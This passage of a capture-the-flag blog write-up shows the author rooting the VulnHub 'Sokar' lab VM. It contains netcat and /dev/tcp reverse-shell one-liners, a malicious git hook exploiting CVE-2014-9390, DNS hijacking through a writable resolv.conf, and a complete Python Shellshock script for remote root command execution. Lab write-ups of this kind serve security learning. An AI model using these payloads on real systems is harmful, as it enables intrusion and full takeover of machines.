+<p>I thought I would copy this <code>build</code> binary off the box as I don’t exactly have a nice interactive shell to work with yet. <code>apophis</code> was also not able to to connect via <code>tcp/51242</code> outbound, which further confirmed my suspicions on the <code>user</code> module being used in iptables. I copied the binary to <code>/tmp/build</code> and pushed it out via netcat as <code>bynarr</code> (using my helper script) towards my local Kali linux install. Finally I had <code>build</code> locally to play with.</p>
+
+<p>I later noticed it was a 64bit binary, so I had to move it over to my 64bit install of Kali Linux to inspect further.
+Running it asked you if you wanted to &lsquo;build?&rsquo;:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ ./build
+Build? (Y/N) Y
+Cloning into '/mnt/secret-project'...
+ssh: Could not resolve hostname sokar-dev:: Name or service not known
+fatal: The remote end hung up unexpectedly
+</code></pre>
+
+<p>That looks very much like the output of a git clone attempt. Knowing what the binary expects now, I continued to run this on Sokar via my Shellshock wrapper for <code>apophis</code>:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ python apophis.py &quot;echo Y | /home/apophis/build&quot;
+ * Executing /usr/bin/python -c &quot;import time; time.sleep(2); print 'overdrive'&quot; | /usr/bin/python -c &quot;import pty; pty.spawn(['/bin/su', '-l', '-c','echo Y | /home/apophis/build', 'apophis']);&quot;
+
+Password:
+Cloning into '/mnt/secret-project'...
+ssh: Could not resolve hostname sokar-dev: Temporary failure in name resolution
+fatal: Could not read from remote repository.
+
+Please make sure you have the correct access rights
+and the repository exists.
+Build? (Y/N)
+</code></pre>
+
+<p>The same hostname resolution failure occurred. Hmm. Thinking about this, it looks like it is trying to clone a repository (as root??) to <code>/mnt/secret-project</code> from <code>sokar-dev</code> which does not resolve.</p>
+
+<h3 id="the-impossible-b0f:6256545d38ed18a4e5f3162703192bb4">the impossible b0f</h3>
+
+<p>I was very unsure about what the next move should be. Playing around some more with the binary, it appeared as though there may be a buffer overflow problem when providing a answer to <code>build.</code>:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ ./build
+Build? (Y/N) YY
+*** buffer overflow detected ***: ./build terminated
+======= Backtrace: =========
+/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x37)[0x2b53e6df5fe7]
+/lib/x86_64-linux-gnu/libc.so.6(+0xefea0)[0x2b53e6df4ea0]
+/lib/x86_64-linux-gnu/libc.so.6(__gets_chk+0x195)[0x2b53e6df4df5]
+./build(main+0xea)[0x2b53e68e29d9]
+/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xfd)[0x2b53e6d23ead]
+./build(+0x7d9)[0x2b53e68e27d9]
+======= Memory map: ========
+2b53e68e2000-2b53e68e3000 r-xp 00000000 fe:00 667555                     /root/sokar/build
+2b53e68e3000-2b53e68e7000 rwxp 00000000 00:00 0
+2b53e6900000-2b53e6902000 rwxp 00000000 00:00 0
+2b53e6ae2000-2b53e6ae3000 rwxp 00000000 fe:00 667555                     /root/sokar/build
+2b53e6ae3000-2b53e6b03000 r-xp 00000000 fe:00 532890                     /lib/x86_64-linux-gnu/ld-2.13.so
+2b53e6d02000-2b53e6d03000 r-xp 0001f000 fe:00 532890                     /lib/x86_64-linux-gnu/ld-2.13.so
+2b53e6d03000-2b53e6d04000 rwxp 00020000 fe:00 532890                     /lib/x86_64-linux-gnu/ld-2.13.so
+2b53e6d04000-2b53e6d05000 rwxp 00000000 00:00 0
+2b53e6d05000-2b53e6e87000 r-xp 00000000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
+2b53e6e87000-2b53e7087000 ---p 00182000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
+2b53e7087000-2b53e708b000 r-xp 00182000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
+2b53e708b000-2b53e708c000 rwxp 00186000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
+2b53e708c000-2b53e7091000 rwxp 00000000 00:00 0
+2b53e7091000-2b53e70a6000 r-xp 00000000 fe:00 523276                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+2b53e70a6000-2b53e72a6000 ---p 00015000 fe:00 523276                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+2b53e72a6000-2b53e72a7000 rwxp 00015000 fe:00 523276                     /lib/x86_64-linux-gnu/libgcc_s.so.1
+2b53e886b000-2b53e888c000 rwxp 00000000 00:00 0                          [heap]
+7fff340b7000-7fff340d8000 rwxp 00000000 00:00 0                          [stack]
+7fff341eb000-7fff341ed000 r-xp 00000000 00:00 0                          [vdso]
+ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
+[1]    18571 abort      ./build
+</code></pre>
+
+<p>I slapped <code>build</code> into <code>gdb</code> to take a closer look at the potential overflow as well as the security features that <code>build</code> has been compiled with:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ gdb -q ./build
+Reading symbols from /root/sokar/build...(no debugging symbols found)...done.
+gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : ENABLED
+NX        : disabled
+PIE       : ENABLED
+RELRO     : disabled
+</code></pre>
+
+<p>:O The <code>CANARY</code> explains the failure in <code>__fortify_fail</code>. Disassembly of the <code>main</code> function reveals a call to <code>__gets_chk</code> which is responsible for the canary validation:</p>
+
+<pre><code class="language-bash">gdb-peda$ disass main
+Dump of assembler code for function main:
+
+ [... snip ...]
+
+   0x00000000000009cc &lt;+221&gt;:   mov    esi,0x2
+   0x00000000000009d1 &lt;+226&gt;:   mov    rdi,rbx
+   0x00000000000009d4 &lt;+229&gt;:   call   0x760 &lt;__gets_chk@plt&gt;
+   0x00000000000009d9 &lt;+234&gt;:   lea    rsi,[rbp-0x30]
+   0x00000000000009dd &lt;+238&gt;:   mov    rdi,rbx
+   0x00000000000009e0 &lt;+241&gt;:   call   0x790 &lt;strcmp@plt&gt;
+   0x00000000000009e5 &lt;+246&gt;:   test   eax,eax
+
+ [... snip ...]
+</code></pre>
+
+<p>It is possible that the original source was using <code>gets()</code> without a bounds check, but is compiled with SSP. This coupled with the fact that it is a 64bit binary and Sokar having ASLR enabled, made my head hurt. In fact, I was very demotivated at this stage as exploitation under these scenarios is very difficult.</p>
+
+<p>I fiddled around a little more with the binary, and inspected the call to <code>encryptDecrypt</code>:</p>
+
+<pre><code class="language-bash">gdb-peda$ disass encryptDecrypt
+Dump of assembler code for function encryptDecrypt:
+   0x00000000000008ac &lt;+0&gt;: mov    rdx,rdi
+   0x00000000000008af &lt;+3&gt;: mov    r9d,0x0
+   0x00000000000008b5 &lt;+9&gt;: mov    r11,0xffffffffffffffff
+   0x00000000000008bc &lt;+16&gt;:    mov    r10,rdi
+   0x00000000000008bf &lt;+19&gt;:    mov    eax,0x0
+   0x00000000000008c4 &lt;+24&gt;:    jmp    0x8d6 &lt;encryptDecrypt+42&gt;
+   0x00000000000008c6 &lt;+26&gt;:    movzx  ecx,BYTE PTR [rdx+r8*1]
+   0x00000000000008cb &lt;+31&gt;:    xor    ecx,0x49
+   0x00000000000008ce &lt;+34&gt;:    mov    BYTE PTR [rsi+r8*1],cl
+   0x00000000000008d2 &lt;+38&gt;:    add    r9d,0x1
+   0x00000000000008d6 &lt;+42&gt;:    movsxd r8,r9d
+   0x00000000000008d9 &lt;+45&gt;:    mov    rcx,r11
+   0x00000000000008dc &lt;+48&gt;:    mov    rdi,r10
+   0x00000000000008df &lt;+51&gt;:    repnz scas al,BYTE PTR es:[rdi]
+   0x00000000000008e1 &lt;+53&gt;:    not    rcx
+   0x00000000000008e4 &lt;+56&gt;:    sub    rcx,0x1
+   0x00000000000008e8 &lt;+60&gt;:    cmp    r8,rcx
+   0x00000000000008eb &lt;+63&gt;:    jb     0x8c6 &lt;encryptDecrypt+26&gt;
+   0x00000000000008ed &lt;+65&gt;:    repz ret
+End of assembler dump.
+</code></pre>
+
+<p>This together with pseudo code generated by Hopper helped me understand the encryptDecrypt function running a xor with <strong>I</strong> as the key over a string.</p>
+
+<pre><code class="language-c">void encryptDecrypt(int arg0, int arg1) {
+    rsi = arg1;
+    rdx = arg0;
+    LODWORD(r9) = 0x0;
+    r10 = arg0;
+    do {
+            r8 = sign_extend_64(LODWORD(r9));
+            asm{ repne scasb  };
+            if (r8 &gt;= !0xffffffffffffffff - 0x1) {
+                break;
+            }
+            *(int8_t *)(rsi + r8) = LOBYTE(LODWORD(*(int8_t *)(rdx + r8) &amp; 0xff) ^ 0x49);
+            LODWORD(r9) = LODWORD(r9) + 0x1;
+    } while (true);
+    return;
+}
+</code></pre>
+
+<p>Running the binary in <code>gdb</code> and setting a breakpoint before the <code>system()</code> call, we are able to inspect the 64bit registers, which cleanly reveal the encrypted <strong>and</strong> decrypted versions of the string to be executed.</p>
+
+<pre><code class="language-bash">sokar # gdb -q ./build
+gdb-peda$ r
+Build? (Y/N) n
+OK :(
+[Inferior 1 (process 4450) exited with code 06]
+Warning: not running or target is remote
+gdb-peda$ b *0x0000555555554a38
+Breakpoint 1 at 0x555555554a38
+gdb-peda$ r
+Build? (Y/N) Y
+[----------------------------------registers-----------------------------------]
+RAX: 0x0
+RBX: 0x7fffffffe740 (&quot;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&quot;)
+RCX: 0x7ffff7b26e99 (&lt;setreuid+25&gt;: cmp    rax,0xfffffffffffff000)
+RDX: 0x7fffffffe7a0 (&quot;f&lt;:;f+ 'f. =i*%&amp;',i::!sff;&amp;&amp;=\t:&amp;\&quot;(;d-,?sf;&amp;&amp;=f:,*;,=d9;&amp;#,*=if$'=f:,*;,=d9;&amp;#,*=f&quot;)
+RSI: 0x0
+RDI: 0x7fffffffe740 (&quot;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&quot;)
+RBP: 0x7fffffffe830 --&gt; 0x0
+RSP: 0x7fffffffe740 (&quot;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&quot;)
+RIP: 0x555555554a38 (&lt;main+329&gt;:    mov    eax,0x0)
+R8 : 0x51 ('Q')
+R9 : 0x51 ('Q')
+R10: 0x0
+R11: 0x246
+R12: 0x7fffffffe7a0 (&quot;f&lt;:;f+ 'f. =i*%&amp;',i::!sff;&amp;&amp;=\t:&amp;\&quot;(;d-,?sf;&amp;&amp;=f:,*;,=d9;&amp;#,*=if$'=f:,*;,=d9;&amp;#,*=f&quot;)
+R13: 0x7fffffffe910 --&gt; 0x1
+R14: 0x0
+R15: 0x0
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x555555554a2b &lt;main+316&gt;:   mov    eax,0x0
+   0x555555554a30 &lt;main+321&gt;:   call   0x5555555547a0 &lt;setreuid@plt&gt;
+   0x555555554a35 &lt;main+326&gt;:   mov    rdi,rbx
+=&gt; 0x555555554a38 &lt;main+329&gt;:   mov    eax,0x0
+   0x555555554a3d &lt;main+334&gt;:   call   0x555555554750 &lt;system@plt&gt;
+   0x555555554a42 &lt;main+339&gt;:   mov    rsp,r12
+   0x555555554a45 &lt;main+342&gt;:   jmp    0x555555554a5d &lt;main+366&gt;
+   0x555555554a47 &lt;main+344&gt;:   lea    rsi,[rip+0x12c]        # 0x555555554b7a
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe740 (&quot;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&quot;)
+0008| 0x7fffffffe748 (&quot;/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&quot;)
+0016| 0x7fffffffe750 (&quot;ne ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&quot;)
+0024| 0x7fffffffe758 (&quot;/root@sokar-dev:/root/secret-project /mnt/secret-project/&quot;)
+0032| 0x7fffffffe760 (&quot;kar-dev:/root/secret-project /mnt/secret-project/&quot;)
+0040| 0x7fffffffe768 (&quot;/root/secret-project /mnt/secret-project/&quot;)
+0048| 0x7fffffffe770 (&quot;cret-project /mnt/secret-project/&quot;)
+0056| 0x7fffffffe778 (&quot;ject /mnt/secret-project/&quot;)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x0000555555554a38 in main ()
+gdb-peda$ x/x $rbx
+0x7fffffffe740: 0x2f
+gdb-peda$ x/s $rbx
+0x7fffffffe740:  &quot;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&quot;
+gdb-peda$ x/s $rdx
+0x7fffffffe7a0:  &quot;f&lt;:;f+ 'f. =i*%&amp;',i::!sff;&amp;&amp;=\t:&amp;\&quot;(;d-,?sf;&amp;&amp;=f:,*;,=d9;&amp;#,*=if$'=f:,*;,=d9;&amp;#,*=f&quot;
+gdb-peda$
+</code></pre>
+
+<p>Right before this call though, there is a instruction to <code>call   0x5555555547a0 &lt;setreuid@plt&gt;</code> to set the UID to 0. So, this brought me to the conclusion that <code>build</code> is running <code>/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/</code> as <code>root</code>. But what is so special about this?</p>
+
+<h3 id="inspecting-git:6256545d38ed18a4e5f3162703192bb4">inspecting git</h3>
+
+<p>I did a lot of poking around here, wondering if I should pursue the avenue of trying to exploit the b0f which has the SSP, or should I try and figure out the significance of a <code>git clone</code> as root? One of my first theories was that if I could get <code>sokar-dev</code> to resolve to something I am in control of (like my Kali vm), I could attempt to have git clone a setuid shell. This was, of course, before I remembered that the only permissions <code>git</code> will honor really is the symlink and executable bits :(</p>
+
+<p>Further enumeration while I was thinking about the possibilities revealed that <code>/mnt/</code> was actually mounted with the <code>vfat</code> filesystem!</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ python apophis.py &quot;mount; cat /etc/fstab&quot;
+ * Executing /usr/bin/python -c &quot;import time; time.sleep(2); print 'overdrive'&quot; | /usr/bin/python -c &quot;import pty; pty.spawn(['/bin/su', '-l', '-c','mount; cat /etc/fstab', 'apophis']);&quot;
+
+Password:
+/dev/sda1 on / type ext4 (rw)
+proc on /proc type proc (rw)
+sysfs on /sys type sysfs (rw)
+devpts on /dev/pts type devpts (rw,gid=5,mode=620)
+tmpfs on /dev/shm type tmpfs (rw)
+/dev/sdb1 on /mnt type vfat (rw,uid=501,gid=502)
+none on /proc/sys/fs/binfmt_misc type binfmt_misc (rw)
+
+#
+# /etc/fstab
+# Created by anaconda on Wed Nov 12 13:29:15 2014
+#
+# Accessible filesystems, by reference, are maintained under '/dev/disk'
+# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info
+#
+UUID=cdb3ac23-d831-4104-bc76-e3a56314b6e4 /                       ext4    defaults        1 1
+tmpfs                   /dev/shm                tmpfs   defaults        0 0
+devpts                  /dev/pts                devpts  gid=5,mode=620  0 0
+sysfs                   /sys                    sysfs   defaults        0 0
+proc                    /proc                   proc    defaults        0 0
+/dev/sdb1       /mnt            vfat    defaults,uid=501,gid=502    0 0
+</code></pre>
+
+<p>As you can see, <code>/mnt</code> also specified the uid/gid for files on the mount, so even if I <em>were</em> able to get a suid shell onto the file system, root will not be the one owning it.</p>
+
+<p>However. <code>vfat</code>. Why <code>vfat</code>&hellip; Of course! <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9390">CVE-2014-9390</a>. The potential client side code execution bug in older <code>git</code> versions where a case insensitive filesystem may cause the <code>git</code> client to read hooks from <code>.Git/hooks</code> instead of <code>.git/hooks</code>. And, of course, <code>vfat</code> is a case insensitive filesystem, which makes for the perfect scenario to exploit this bug.</p>
+
+<p>I checked up on the installed version of <code>git</code> on Sokar, just to make sure that it is in fact vulnerable:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ python apophis.py &quot;git --version&quot;
+ * Executing /usr/bin/python -c &quot;import time; time.sleep(2); print 'overdrive'&quot; | /usr/bin/python -c &quot;import pty; pty.spawn(['/bin/su', '-l', '-c','git --version', 'apophis']);&quot;
+
+Password:
+git version 2.2.0
+</code></pre>
+
+<p>Great. <code>git</code> version 2.2.1 fixed this bug so we are in luck.</p>
+
+<h2 id="rooting-sokar:6256545d38ed18a4e5f3162703192bb4">rooting sokar</h2>
+
+<p>All of this information was great to have, but it still had one major problem. How can I clone a repository <strong>I</strong> own? I made <em>countless</em> attempts to try fool the environment into resolving <code>sokar-dev</code> to my Kali Host. Every single one failed. All of the material on the topic that I found online suggest that the SUID process &lsquo;cleans up&rsquo; the environment, especially for reasons such as this one.</p>
+
+<p>I started doubting my plan and was nearing a point of leaving Sokar for a bit to rethink my strategy when I realized the following gem:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ python apophis.py &quot;find /etc/ -writable -type f 2&gt;/dev/null | xargs ls -lh&quot;
+ * Executing /usr/bin/python -c &quot;import time; time.sleep(2); print 'overdrive'&quot; | /usr/bin/python -c &quot;import pty; pty.spawn(['/bin/su', '-l', '-c','find /etc/ -writable -type f 2&gt;/dev/null | xargs ls -lh', 'apophis']);&quot;
+
+Password:
+-rw-rw-rw- 1 root root 19 Jan  2 20:12 /etc/resolv.conf
+</code></pre>
+
+<p><code>/etc/resolv.conf</code> is <strong>world writable</strong>. This is perfect! I can change the DNS server to use to one that I control, obviously feeding it a IP that will be my local Kali instance :D</p>
+
+<h3 id="preparing-the-environment-and-exploit:6256545d38ed18a4e5f3162703192bb4">preparing the environment and exploit</h3>
+
+<p>I decided to use <code>dnsmasq</code> for a quick to setup DNS server. I added a line to <code>/etc/dnsmasq.hosts</code> to answer a query for <code>sokar-dev</code>:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ cat /etc/dnsmasq.hosts
+192.168.217.174 sokar-dev
+</code></pre>
+
+<p>&hellip; and started the <code>dnsmasq</code> server:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ dnsmasq --no-daemon --log-queries -H /etc/dnsmasq.hosts
+
+dnsmasq: started, version 2.62 cachesize 150
+dnsmasq: compile time options: IPv6 GNU-getopt DBus i18n IDN DHCP DHCPv6 no-Lua TFTP conntrack
+dnsmasq: reading /etc/resolv.conf
+dnsmasq: using nameserver 192.168.252.2#53
+dnsmasq: read /etc/hosts - 6 addresses
+dnsmasq: read /etc/dnsmasq.hosts - 1 addresses
+</code></pre>
+
+<p>Testing my DNS server proved that it was working just fine:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ dig sokar-dev @127.0.0.1
+
+; &lt;&lt;&gt;&gt; DiG 9.8.4-rpz2+rl005.12-P1 &lt;&lt;&gt;&gt; sokar-dev @127.0.0.1
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 48044
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;sokar-dev.         IN  A
+
+;; ANSWER SECTION:
+sokar-dev.      0   IN  A   192.168.217.174
+
+;; Query time: 13 msec
+;; SERVER: 127.0.0.1#53(127.0.0.1)
+;; WHEN: Tue Feb  3 12:12:02 2015
+;; MSG SIZE  rcvd: 43
+</code></pre>
+
+<p>Awesome. The next step was to replace the contents of Sokar&rsquo;s <code>/etc/resolv.conf</code> so that the dns server to use is <em>192.168.217.174</em> with the command <code>python apophis.py &quot;echo \&quot;nameserver\ 192.168.217.174\&quot; &gt; /etc/resolv.conf&quot;</code> and confirm that it worked:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ python apophis.py &quot;cat /etc/resolv.conf&quot;
+ * Executing /usr/bin/python -c &quot;import time; time.sleep(2); print 'overdrive'&quot; | /usr/bin/python -c &quot;import pty; pty.spawn(['/bin/su', '-l', '-c','cat /etc/resolv.conf', 'apophis']);&quot;
+
+Password:
+nameserver 192.168.217.174
+</code></pre>
+
+<p>Great. Testing time!</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ python apophis.py &quot;echo Y | /home/apophis/build&quot;
+ * Executing /usr/bin/python -c &quot;import time; time.sleep(2); print 'overdrive'&quot; | /usr/bin/python -c &quot;import pty; pty.spawn(['/bin/su', '-l', '-c','echo Y | /home/apophis/build', 'apophis']);&quot;
+
+Password:
+Cloning into '/mnt/secret-project'...
+Host key verification failed.
+fatal: Could not read from remote repository.
+
+Please make sure you have the correct access rights
+and the repository exists.
+Build? (Y/N)
+</code></pre>
+
+<p>Yesssssss, and nooooooooo. From the <code>dnsmasq</code> console output I could see the request for <code>sokar-dev</code> coming in and a reply getting sent:</p>
+
+<pre><code class="language-bash">dnsmasq: query[A] sokar-dev from 192.168.217.163
+dnsmasq: /etc/dnsmasq.hosts sokar-dev is 192.168.217.174
+</code></pre>
+
+<p>However, in order for the SSH session to happen, I need to either accept or bypass the host key verification. There are many ways to do this, but sadly, with my current (still! :D) nonexistent interactive shell, I can not type &lsquo;yes&rsquo;. I can not use <code>ssh-keyscan &gt;&gt; ~/.ssh/known_hosts</code> as I can&rsquo;t write to <code>root</code>&rsquo;s <code>.ssh</code> directory, nor can I modify the command that is being passed onto <code>system()</code> in the binary to specify <code>-o StrictHostKeyChecking=no</code>.</p>
+
+<p>Unfortunately, due to these restrictions, I had to finally give in and go one step back to <code>bynarr.py</code> and use his allowed egress access on <code>tcp/51242</code> to build a interactive shell. On one session I started a netcat listener, and on another, I ran <code>python bynarr.py &quot;/bin/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.217.174 51242 &gt;/tmp/f&quot;</code>.</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ nc -lvp 51242
+listening on [any] 51242 ...
+192.168.217.163: inverse host lookup failed: Unknown server error : Connection timed out
+connect to [192.168.217.174] from (UNKNOWN) [192.168.217.163] 40382
+sh: no job control in this shell
+sh-4.1$ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+[bynarr@sokar cgi-bin]$ su - apophis
+su - apophis
+Password: overdrive
+
+[apophis@sokar ~]$ id
+id
+uid=501(apophis) gid=502(apophis) groups=502(apophis)
+[apophis@sokar ~]$
+</code></pre>
+
+<p>With the interactive shell as <code>apophis</code> now, I was able to accept the SSH hostkey check.</p>
+
+<p>The next thing left on the list was to prepare a <code>git</code> repository that can actually be cloned. Setting one up is reaaaaally simple. Because I knew that it will be looking for <code>/root/secret-project</code>, I prepared just that on my Kali VM:</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ cd /root
+leonjza@kali/root $ mkdir secret-project
+leonjza@kali/root $ cd secret-project
+leonjza@kali/root/secret-project $ git init --bare
+Initialized empty Git repository in /root/secret-project/
+leonjza@kali/root/secret-project | git:master $
+</code></pre>
+
+<p>Thats it&hellip; Next, I cloned it locally in a different folder.</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar $ git clone ssh://127.0.0.1/root/secret-project
+Cloning into 'secret-project'...
+root@127.0.0.1's password:
+warning: You appear to have cloned an empty repository.
+leonjza@kali/sokar $ cd secret-project
+leonjza@kali/sokar/secret-project | git:master $
+</code></pre>
+
+<p>Done. Working from a PoC exploit found <a href="https://gitlab.com/mehmet/cve-2014-9390">here</a>, I continued to prepare a similar exploit, except for the fact that I changed the actual hook to connect to my Mac (hosting the VM&rsquo;s) on a <code>tcp/22</code> netcat listener, spawning a shell. I knew <code>tcp/22</code> traffic was allowed due to the SSH host key verification step that needed some work :)</p>
+
+<pre><code class="language-bash">leonjza@kali/sokar/secret-project | git:master $ mkdir .Git
+leonjza@kali/sokar/secret-project | git:master $ cd .Git
+leonjza@kali/sokar/secret-project/.Git | git:master $ mkdir hooks
+leonjza@kali/sokar/secret-project/.Git | git:master $ cd hooks
+leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ vim post-checkout
+leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ cat post-checkout
+#!/bin/sh
+bash -i &gt;&amp; /dev/tcp/192.168.217.1/22 0&gt;&amp;1
+leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ chmod +x ./post-checkout
+leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git add -A
+leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git commit -m 'pwnd'
+[master (root-commit) ee364fd] pwnd
+ Committer: root &lt;root@localhost.localdomain&gt;
+
+ 1 file changed, 2 insertions(+)
+ create mode 100755 .Git/hooks/post-checkout
+leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git push -u origin master
+root@127.0.0.1's password:
+Counting objects: 5, done.
+Compressing objects: 100% (2/2), done.
+Writing objects: 100% (5/5), 345 bytes, done.
+Total 5 (delta 0), reused 0 (delta 0)
+To ssh://127.0.0.1/root/secret-project
+ * [new branch]      master -&gt; master
+Branch master set up to track remote branch master from origin.
+leonjza@kali/sokar/secret-project/.Git/hooks | git:master $
+</code></pre>
+
+<p>With my evil repository ready, it was time to try that <code>build</code> again :)</p>
+
+<pre><code class="language-bash">[apophis@sokar ~]$ ./build
+./build
+Build? (Y/N) Y
+Y
+Cloning into '/mnt/secret-project'...
+root@sokar-dev's password: # redact lol
+
+remote: Counting objects: 5, done.
+remote: Compressing objects: 100% (2/2), done.
+Receiving objects: 100% (5/5), done.
+remote: Total 5 (delta 0), reused 0 (delta 0)
+Checking connectivity... done.
+
+</code></pre>
+
+<p>This shell just &lsquo;hung&rsquo; there, however, the netcat listener on my Mac had a different story to tell:</p>
+
+<pre><code>leonjza@laptop » sudo nc -lv 22
+Password:
+[root@sokar secret-project]# cat /root/flag
+cat /root/flag
+                0   0
+                |   |
+            ____|___|____
+         0  |~ ~ ~ ~ ~ ~|   0
+         |  |   Happy   |   |
+      ___|__|___________|___|__
+      |/\/\/\/\/\/\/\/\/\/\/\/|
+  0   |    B i r t h d a y    |   0
+  |   |/\/\/\/\/\/\/\/\/\/\/\/|   |
+ _|___|_______________________|___|__
+|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|
+|                                   |
+|     V  u  l  n  H  u  b   ! !     |
+| ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ |
+|___________________________________|
+
+=====================================
+| Congratulations on beating Sokar! |
+|                                   |
+|  Massive shoutout to g0tmi1k and  |
+| the entire community which makes  |
+|         VulnHub possible!         |
+|                                   |
+|    rasta_mouse (@_RastaMouse)     |
+=====================================
+[root@sokar secret-project]#
+</code></pre>
+
+<h2 id="conclusion:6256545d38ed18a4e5f3162703192bb4">conclusion</h2>
+
+<p>What a blast! Them feels of r00t are so <em>gooood</em>. For the curios, that firewall that was making life so difficult:</p>
+
+<pre><code class="language-bash">[root@sokar secret-project]# cat /etc/sysconfig/iptables
+cat /etc/sysconfig/iptables
+# Firewall configuration written by system-config-firewall
+# Manual customization of this file is not recommended.
+*filter
+:INPUT ACCEPT [0:0]
+:FORWARD ACCEPT [0:0]
+:OUTPUT ACCEPT [0:0]
+-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+-A INPUT -p icmp -j DROP
+-A INPUT -i lo -j ACCEPT
+-A INPUT -m state --state ESTABLISHED -p tcp --sport 22 -j ACCEPT
+-A INPUT -m state --state NEW,ESTABLISHED -p tcp --dport 591 -j ACCEPT
+-A INPUT -p udp --sport 53 -j ACCEPT
+-A OUTPUT -m state --state NEW,ESTABLISHED -m owner --uid-owner 0 -p tcp --dport 22 -j ACCEPT
+-A OUTPUT -p udp --dport 53 -m owner --uid-owner 0 -j ACCEPT
+-A OUTPUT -m state --state ESTABLISHED -p tcp --sport 591 -j ACCEPT
+-A OUTPUT -m state --state NEW,ESTABLISHED -m owner --gid-owner 501 -p tcp --dport 51242 -j ACCEPT
+-A OUTPUT -j DROP
+COMMIT
+</code></pre>
+
+<h2 id="edit:6256545d38ed18a4e5f3162703192bb4">edit</h2>
+
+<p>I have been wondering if it was possible to get complete remote root command execution using the sample python scripts used for apophis and bynarr. Well, turns out the <code>lime</code> script run with <code>sudo</code> can be shocked too!</p>
+
+<pre><code class="language-python">#!/usr/bin/python
+
+# 2015 Leon Jacobs
+# sokar remote root command execution
+
+import requests
+import sys
+
+if len(sys.argv) &lt; 2:
+
+    print &quot; * Usage %s &lt;cmd&gt;&quot; % sys.argv[0]
+    sys.exit(1)
+
+# Grab the command from the args
+command = sys.argv[1].strip()
+
+# prep to shock the lime script
+root_command = &quot;&quot;&quot;echo &quot;N&quot; | sudo MAIL=\\&quot;() { :;}; %s;\\&quot; /home/bynarr/lime&quot;&quot;&quot; % command
+
+# prep to exec the command as bynarr
+payload = &quot;&quot;&quot;/usr/bin/python -c &quot;import time; time.sleep(1); print 'fruity'&quot; | /usr/bin/python -c &quot;import pty; pty.spawn(['/bin/su','-c','%s', 'bynarr']);&quot; &quot;&quot;&quot; % root_command
+
+# be verbose about the full command
+print &quot; * Executing %s\n&quot; % payload
+
+# Send the sploit
+headers = { &quot;User-Agent&quot;: &quot;() { :;};echo;%s&quot; % payload }
+print requests.get(&quot;http://192.168.217.163:591/cgi-bin/cat&quot;, headers=headers).text.strip()
+</code></pre>
+
+<p>Run with <code>python root.py &quot;/bin/cat /root/flag&quot;</code> :D</p>
+
+<p>Thanks to <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> for the VM, and as always, <a href="https://twitter.com/VulnHub">@VulnHub</a> for the hosting and great community!</p>
+
+  </div>
+  <div id="disqus_thread"></div>
+</div>
+
+
+<script type="text/javascript">
+var disqus_shortname = "slashnote";
+(function () {
+    var s = document.createElement('script'); s.async = true;
+    s.type = 'text/javascript';
+    s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+    (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+}());
+</script>
+
+
+
+<script type="text/javascript">
+    var disqus_shortname = "slashnote";
+    (function() {
